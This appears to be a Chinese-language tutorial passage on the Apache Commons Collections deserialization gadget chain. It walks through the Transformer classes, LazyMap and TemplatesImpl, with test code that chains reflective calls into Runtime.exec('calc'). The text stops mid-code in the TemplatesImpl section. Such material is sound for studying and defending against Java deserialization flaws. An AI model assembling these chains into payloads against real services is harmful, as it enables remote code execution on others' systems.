### 一、简介
* * *
Apache Commons 是对 JDK 的拓展，包含了很多开源的工具，用于解决平时编程经常会遇到的问题。Apache Commons 当中有一个组件叫做
Apache Commons Collections，封装了 Java 的 Collection 相关类对象。
CC链 编写的是测试代码，和 ysoserial 中的稍有不同。 下面的是经常用到的 `非常重要` 的Transformer 接口的实现类。
#### 1.1 ConstantTransformer
Transformer 接口的实现类，并重写了其接口类的 transform 方法。其 transform 方法作用是获取一个对象类型，关键代码如下：
    public class ConstantTransformer implements Transformer, Serializable {
        static final long serialVersionUID = 6374440726369055124L;
        public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);
        private final Object iConstant;
        //构造函数
        public ConstantTransformer(Object constantToReturn) {
            this.iConstant = constantToReturn;
        }
        //重写的 transform 方法，获取一个对象类型
        public Object transform(Object input) {
            return this.iConstant;
        }
    }
#### 1.2 InvokerTransformer
Transformer 接口的实现类，并重写了其接口类的 transform 方法。其 transform
方法作用是反射调用指定的方法并返回方法调用结果，关键代码如下：
    public class InvokerTransformer implements Transformer, Serializable {
        static final long serialVersionUID = -8653385846894047688L;
        private final String iMethodName;
        private final Class[] iParamTypes;
        private final Object[] iArgs;
        //构造函数
        public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
            this.iMethodName = methodName;
            this.iParamTypes = paramTypes;
            this.iArgs = args;
        }
        //重写的 transform 方法，反射调用指定的方法并返回方法调用结果
        public Object transform(Object input) {
            if (input == null) {
                return null;
            } else {
                try {
                    Class cls = input.getClass();
                    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                    return method.invoke(input, this.iArgs);
                } catch …………
            }
        }
    }
测试：
    // 测试 InvokerTransformer
    public class Test {
        public static void main(String[] args) {
            Transformer transformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
            transformer.transform(Runtime.getRuntime());
        }
    }
    ###输出
    弹出计算器
#### 1.3 InstantiateTransformer
Transformer 接口的实现类，并重写了其接口类的 transform 方法。其 transform
方法作用是反射调用构造函数将类实例化，关键代码如下：
    public class InstantiateTransformer implements Transformer, Serializable {
        static final long serialVersionUID = 3786388740793356347L;
        public static final Transformer NO_ARG_INSTANCE = new InstantiateTransformer();
        private final Class[] iParamTypes;
        private final Object[] iArgs;
        //构造函数
        public InstantiateTransformer(Class[] paramTypes, Object[] args) {
            this.iParamTypes = paramTypes;
            this.iArgs = args;
        }
        //重写的 transform 方法，反射调用构造函数将类实例化。
        public Object transform(Object input) {
            Constructor con = ((Class)input).getConstructor(this.iParamTypes);
            return con.newInstance(this.iArgs);
        }
测试：
    // Student 类
    public class Student {
        public Student(String name) {
            System.out.println("学生姓名:" + name);
        }
    }
    // 测试 InstantiateTransformer
    public class Test {
        public static void main(String[] args) {
            Transformer instantiateTransformer = new InstantiateTransformer(new Class[]{String.class}, new Object[]{"小明"});
            instantiateTransformer.transform(Student.class);
        }
    }
    ###输出
    学生姓名:小明
    Process finished with exit code 0
#### 1.4 ChainedTransformer
Transformer 接口的实现类，并重写了其接口类的 transformer 方法。其 transform 方法作用是实现数组链式调用。我们只需传入一个
Transformer[] 给 ChainedTransformer，然后执行 ChainedTransformer 的 transform
方法便可以链式调用 Transformer[] 中每个 Transformer 的 transform 方法。关键代码如下：
    public class ChainedTransformer implements Transformer, Serializable {
        static final long serialVersionUID = 3514945074733160196L;
        private final Transformer[] iTransformers;
        //构造函数
        public ChainedTransformer(Transformer[] transformers) {
            this.iTransformers = transformers;
        }
        //重写的 transform 方法，链式调用  Transformer[] 中每个 Transformer 的 transform 方法
        public Object transform(Object object) {
            for(int i = 0; i < this.iTransformers.length; ++i) {
                object = this.iTransformers[i].transform(object);
            }
            return object;
        }
    }
测试：（`很重要` 利用 ChainedTransformer 实现 Runtime. _getRuntime_ ().exec("calc") ）
    // 测试 ChainedTransformer
    public class Test {
        public static void main(String[] args) {
            //Transformer数组
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
            };
            //ChainedTransformer实例
            Transformer chainedTransformer = new ChainedTransformer(transformers);
            chainedTransformer.transform("test");
        }
    }
    ###输出
    弹出计算器
那么我们如何触发 ChainedTransformer 的 transform 方法呢？这就引出了 LazyMap 类。
#### 1.5 LazyMap（重要）
其 get 方法中可以触发 ChainedTransformer 的 transform 方法。
    public class LazyMap extends AbstractMapDecorator implements Map, Serializable {
        private static final long serialVersionUID = 7990956402564206740L;
        protected final Transformer factory;
        //可控制 factory 为 ChainedTransformer
        public static Map decorate(Map map, Transformer factory) {
            return new LazyMap(map, factory);
        }
        protected LazyMap(Map map, Transformer factory) {
            super(map);
            if (factory == null) {
                throw new IllegalArgumentException("Factory must not be null");
            } else {
                this.factory = factory;
            }
        }
        //利用 get 方法可实现调用 ChainedTransformer#transform()
        public Object get(Object key) {
            if (!super.map.containsKey(key)) {
                //关键点
                Object value = this.factory.transform(key);
                super.map.put(key, value);
                return value;
            } else {
                return super.map.get(key);
            }
        }
    }
测试：
    // 测试 LazyMap
    public class Test {
        public static void main(String[] args) {
            //Transformer数组
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
            };
            //ChainedTransformer实例
            Transformer chainedTransformer = new ChainedTransformer(transformers);
            Map uselessMap = new HashMap();
            Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);
            lazyMap.get("test");
        }
    }
    ###输出
    弹出计算器
那么如何反序列化时触发 LazyMap 的 get 方法呢？下面 CC 链中将会介绍几种触发 LazyMap#get 的方法。
#### 1.6 TemplatesImpl（重要）
这个类不在 Apache Commons Collections 中。但是 TemplatesImpl
这个类很特殊，我们可以借助其动态加载包含恶意的字节码，部分简化代码如下：
    public final class TemplatesImpl implements Templates, Serializable {
        private String _name = null;
        private byte[][] _bytecodes = null;
        private transient TransformerFactoryImpl _tfactory = null;
        //关键方法：newTransformer()
        public synchronized Transformer newTransformer()
                    throws TransformerConfigurationException
                {
                    TransformerImpl transformer;
                    // 关键点，调用 getTransletInstance()
                    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
                        _indentNumber, _tfactory);
                }
        //继续跟进 getTransletInstance() 方法：
        private Translet getTransletInstance()
            throws TransformerConfigurationException {
            try {
                if (_name == null) return null;
                //先判断是否为 null，如果为 null 的话去加载字节码，紧接着 newInstance() 对其实例化。
                if (_class == null) defineTransletClasses();
                AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
                …………
                }
        }
        //继续跟进 defineTransletClasses() 方法:
        private void defineTransletClasses()
            throws TransformerConfigurationException {
            …………